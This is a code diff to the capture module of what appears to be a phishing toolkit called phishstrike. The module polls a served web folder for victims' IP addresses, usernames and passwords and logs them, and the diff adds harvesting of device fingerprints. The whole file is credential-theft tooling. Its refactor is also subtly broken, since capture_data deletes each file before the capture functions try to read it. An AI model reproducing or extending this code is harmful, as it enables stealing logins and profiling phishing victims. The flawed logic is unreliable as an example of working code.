@@ -1,19 +1,34 @@
 import os
 import time
 
+import json
 from phishstrike.core import database
 from phishstrike.lib.dashboard_client import notify_dashboard_refresh
 from phishstrike.lib.terminal_ui import *
 from phishstrike import state
 
 
+def _read_and_remove(filepath: str):
+    """Safely read and remove a file (avoids TOCTOU race)."""
+    try:
+        with open(filepath, "r") as f:
+            content = f.read()
+        try:
+            os.remove(filepath)
+        except OSError:
+            pass
+        return content
+    except (OSError, IOError):
+        return ""
+
+
 def capture_ip(silent: bool = False) -> None:
     ip_file = os.path.join(state.BASE_DIR, ".server/www/ip.txt")
-    if not os.path.exists(ip_file):
+    content = _read_and_remove(ip_file)
+    if not content:
         return
 
-    with open(ip_file, "r") as f:
-        lines = f.readlines()
+    lines = content.splitlines()
     ip = ""
     for line in lines:
         if "IP: " in line:
@@ -38,8 +53,11 @@ def capture_ip(silent: bool = False) -> None:
     auth_dir = os.path.join(state.BASE_DIR, "auth")
     os.makedirs(auth_dir, exist_ok=True)
     auth_ip_file = os.path.join(auth_dir, "ip.txt")
-    with open(auth_ip_file, "a") as f:
-        f.writelines(lines)
+    try:
+        with open(auth_ip_file, "a") as f:
+            f.write(content)
+    except OSError:
+        pass
 
     print("\r\033[K", end="")
     print(
@@ -66,23 +84,56 @@ def capture_ip(silent: bool = False) -> None:
     notify_dashboard_refresh()
 
 
-def capture_creds(silent: bool = False) -> None:
-    user_file = os.path.join(state.BASE_DIR, ".server/www/usernames.txt")
-    if not os.path.exists(user_file):
+def capture_fingerprint(silent: bool = False) -> None:
+    fingerprint_file = os.path.join(state.BASE_DIR, ".server/www/fingerprint.txt")
+    content = _read_and_remove(fingerprint_file)
+    if not content:
         return
 
-    with open(user_file, "r") as f:
-        lines = f.readlines()
+    for line in content.splitlines():
+        try:
+            data = json.loads(line)
+            database.add_fingerprint(
+                data.get("os", "Unknown"),
+                data.get("browser", "Unknown"),
+                data.get("screen_width", 0),
+                data.get("screen_height", 0),
+                data.get("language", "Unknown"),
+                data.get("time_zone", "Unknown"),
+                data.get("ip", "Unknown")
+            )
+            
+            if not silent:
+                slow_type(
+                    "\n    [+] DEVICE PROFILED: FINGERPRINT SECURED !!",
+                    speed=0.01,
+                    start_rgb=RGB_BLUE,
+                    end_rgb=RGB_CYAN,
+                )
+        except json.JSONDecodeError:
+            continue
+            
+    notify_dashboard_refresh()
+
+
+def capture_creds(silent: bool = False) -> None:
+    user_file = os.path.join(state.BASE_DIR, ".server/www/usernames.txt")
+    content = _read_and_remove(user_file)
+    if not content:
+        return
+
+    lines = content.splitlines()
     account = ""
     password = ""
     for line in lines:
         if "Username:" in line:
-            raw = line.split("Username:")[1].strip()
-            if "Pass:" in raw:
-                raw = raw.split("Pass:")[0].strip()
-            account = raw
+            after_user = line.split("Username:", 1)[1].strip()
+            if "Pass:" in after_user:
+                account = after_user.split("Pass:", 1)[0].strip()
+            else:
+                account = after_user
         if "Pass:" in line:
-            password = line.split("Pass:")[-1].strip()
+            password = line.split("Pass:", 1)[-1].strip()
 
     ip = "Unknown"
     auth_ip_file = os.path.join(state.BASE_DIR, "auth/ip.txt")
@@ -143,38 +194,41 @@ def capture_creds(silent: bool = False) -> None:
 
 def capture_data(silent: bool = False) -> None:
     state.stop_monitoring.clear()
-    ip_file = os.path.join(state.BASE_DIR, ".server/www/ip.txt")
-    user_file = os.path.join(state.BASE_DIR, ".server/www/usernames.txt")
+    www_dir = os.path.join(state.BASE_DIR, ".server/www")
 
     if not silent:
         wait_msg = "    [*] Waiting for Login Info... [ Ctrl + C to exit ]"
         print("\n" + gradient_text(wait_msg, RGB_BLUE, RGB_WHITE))
     try:
         while not state.stop_monitoring.is_set():
-            if os.path.exists(ip_file):
-                with open(ip_file, "r") as f:
-                    content = f.read()
-                    current_ip = ""
-                    if "IP: " in content:
-                        current_ip = content.split("IP: ")[1].split("\n")[0].strip()
+            ip_file = os.path.join(www_dir, "ip.txt")
+            user_file = os.path.join(www_dir, "usernames.txt")
+            fingerprint_file = os.path.join(www_dir, "fingerprint.txt")
 
-                if current_ip != state.last_captured_ip:
+            ip_content = _read_and_remove(ip_file)
+            if ip_content:
+                current_ip = ""
+                if "IP: " in ip_content:
+                    current_ip = ip_content.split("IP: ")[1].split("\n")[0].strip()
+                if current_ip and current_ip != state.last_captured_ip:
                     capture_ip(silent=silent)
                     state.last_captured_ip = current_ip
 
-                if os.path.exists(ip_file):
-                    os.remove(ip_file)
-
             if state.stop_monitoring.is_set():
                 break
-            time.sleep(0.5)
 
-            if os.path.exists(user_file):
+            user_content = _read_and_remove(user_file)
+            if user_content:
                 if not silent:
                     print(f"\n\n{DARK}[{WHITE}-{DARK}]{PURPLE} Login info Found !!")
                 capture_creds(silent=silent)
-                if os.path.exists(user_file):
-                    os.remove(user_file)
+
+            if state.stop_monitoring.is_set():
+                break
+
+            fp_content = _read_and_remove(fingerprint_file)
+            if fp_content:
+                capture_fingerprint(silent=silent)
 
             if state.stop_monitoring.is_set():
                 break
